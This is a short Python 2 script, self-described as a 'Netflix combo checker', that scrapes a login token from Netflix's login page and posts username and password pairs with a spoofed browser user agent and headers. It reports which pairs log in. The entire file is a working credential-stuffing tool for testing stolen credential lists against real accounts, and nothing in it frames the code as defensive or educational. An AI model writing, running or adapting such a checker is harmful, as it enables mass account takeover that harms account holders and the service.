import urllib2
import urllib
from cookielib import CookieJar
import re

'''
    Written by Yessine Taktak ( https://github.com/yassintaktak )
    https://seuriflow.com/
    Netflix combo checker
'''


class Main:
    def __init__(self):
        self.loaded = True
        self.returnOptionsSTR = False

    def checkLoadingState(self):
        if(self.loaded):
            return True
        else:
            return False
    def checkReturnOptionsSTR(self):
        if(self.returnOptionsSTR):
            return True
        else:
            return False
    def authenticate(self, username, password):
        dataTokens = self.opener.open("https://www.netflix.com/tn-en/login").read()
        token_1 = re.findall('name="authURL" value="(.*?)"', dataTokens)[0]
        formdata = {
            "authURL" : token_1,
            "userLoginId" : username,
            "password" : password,
            "rememberMe" : "true",
            "flow" : "websiteSignUp",
            "mode" : "login",
            "action" : "loginAction",
            "withFields" : "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
            "nextPage" : "",
            "showPassword" : "",
            "countryCode" : "+216",
            "countryIsoCode" : "TN"
        }
        data_encoded = urllib.urlencode(formdata)
        self.opener.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36'), ('origin', 'https://www.netflix.com'), ('referer', 'https://www.netflix.com/tn-en/login')]
        response = self.opener.open("https://www.netflix.com/tn-en/login", data_encoded)
        content = response.read()
        if('type="password"' not in content):
            return True
        else:
            return False

    def check(self, items):
        try:
            cj = CookieJar()
            self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
            authentication = self.authenticate(items[0], items[1])
            if(authentication):
                return authentication
            else:
                return False
        except:
            pass
